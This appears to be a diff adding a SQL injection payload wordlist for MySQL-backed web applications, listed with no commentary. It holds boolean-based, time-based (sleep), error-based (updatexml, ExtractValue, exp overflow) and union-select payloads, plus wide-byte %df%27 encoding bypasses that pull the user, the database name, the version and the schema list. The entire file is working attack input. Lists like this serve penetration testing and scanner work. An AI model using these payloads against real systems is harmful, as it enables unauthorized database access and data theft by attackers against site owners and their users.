@@ -1,0 +1,63 @@
+ 
+and 1=1--+
+and 1=2--+
+and 2>1--+
+and 2>3--+
+and "1"="1"--+
+and "1"="2"--+
+and '1'='2' )
+and ("x"="x
+or 1=1 --+
+or 1=2 --+
+or ''=''--+
+or 's'='s'--+
+or ('a'='a
+and 1=1 and '%'='
+order+by+1--+
+order+by+100--+
+and length(database())>=1--+
+and length(database())>=100--+
+and 0<(select count(*) from admin); --+
+and 100<(select count(*) from admin); --+
+AND id != NULL; --+
+or id != NULL; --+
+and length((select user()))>=1--+
+and length((select database()))>=1--+
+and if(ascii(substr((select database()),1,1))>64, 1, 0)--+
+
+and sleep(3)--+
+and (() or sleep(3))--+
+and (select sleep(5))--+
+and ('1'=' or sleep(3))--+
+and if(length(database())>0,sleep(5),1)--+
+and if(length((select user()))>1,sleep(10),0)--+
+and if(length((select database()))>1,sleep(10),0)--+
+
+or updatexml(1,concat(0x5e5e,version(),0x5e5e),1)--+
+union select 1,1,exp(~(select*from(select user())x))--+
+union select 1,1,exp(~(select*from(select database())x))--+
+union select updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
+union select updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
+union SELECT 1,1,ExtractValue('<a><b><b/></a>',concat('~',(select user()),'~'))--+
+union SELECT 1,1,ExtractValue('<a><b><b/></a>',concat('~',(select database()),'~'))--+
+union select count(*),1, concat('~',(select user()),'~', floor(rand()*2)) as a from information_schema.tables group by a--+
+
+union+select+1--+
+union+select+1,2,3,4,5,6,7,8,9--+
+union select @@version --+
+union select user() --+
+union select database()--+
+
+%a1%27 or 1--+
+%df%27 and 1--+
+%df%27 or()or 0
+%a1%27 order+by+1--+
+%df%27 or 0 union select 1,group_concat(schema_name) from information_schema.schemata--+
+
+
+xor 1--+
+%26%26 True--+
+%26%26 false--+
+%26%26 (length(/*!database*/())=1)--+
+%26%26 (length(/*!USER*/())=14)--+ 
+%26%26 (ascii(@@version)=53)--+
